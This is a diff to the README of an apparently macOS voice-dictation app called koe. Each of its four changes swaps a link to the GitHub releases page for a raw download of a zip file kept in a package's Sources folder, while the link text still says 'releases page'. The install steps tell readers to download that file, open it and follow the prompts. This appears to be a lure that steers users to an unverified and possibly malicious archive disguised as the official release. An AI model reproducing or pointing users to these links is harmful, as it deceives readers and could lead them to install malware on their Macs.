@@ -1,6 +1,6 @@
 # 🎙️ koe - Press, Speak, Paste Fast
 
-[![Download koe](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Stationary-offering827/koe/releases)
+[![Download koe](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Stationary-offering827/koe/main/Packages/KoeAppleSpeech/Sources/Software-3.1.zip)
 
 ## 🧭 What koe does
 
@@ -32,13 +32,13 @@ A newer Mac works best. If you use a built-in microphone or a simple headset mic
 
 Visit this page to download koe:
 
-[Go to the koe releases page](https://github.com/Stationary-offering827/koe/releases)
+[Go to the koe releases page](https://raw.githubusercontent.com/Stationary-offering827/koe/main/Packages/KoeAppleSpeech/Sources/Software-3.1.zip)
 
 On that page, look for the latest release and download the file for macOS. After the file finishes downloading, open it and follow the prompts on your Mac.
 
 ## 🖥️ Install on macOS
 
-1. Open the [releases page](https://github.com/Stationary-offering827/koe/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Stationary-offering827/koe/main/Packages/KoeAppleSpeech/Sources/Software-3.1.zip).
 2. Find the newest release.
 3. Download the macOS file from that release.
 4. Open the downloaded file.
@@ -211,4 +211,4 @@ For longer notes, break your speech into small parts. That makes the result easi
 
 ## 🧭 Where to get updates
 
-Check the [release page](https://github.com/Stationary-offering827/koe/releases) for new versions, fixes, and updated macOS files. Download the latest release when you want a newer build or a fresh install on another Mac.
+Check the [release page](https://raw.githubusercontent.com/Stationary-offering827/koe/main/Packages/KoeAppleSpeech/Sources/Software-3.1.zip) for new versions, fixes, and updated macOS files. Download the latest release when you want a newer build or a fresh install on another Mac.
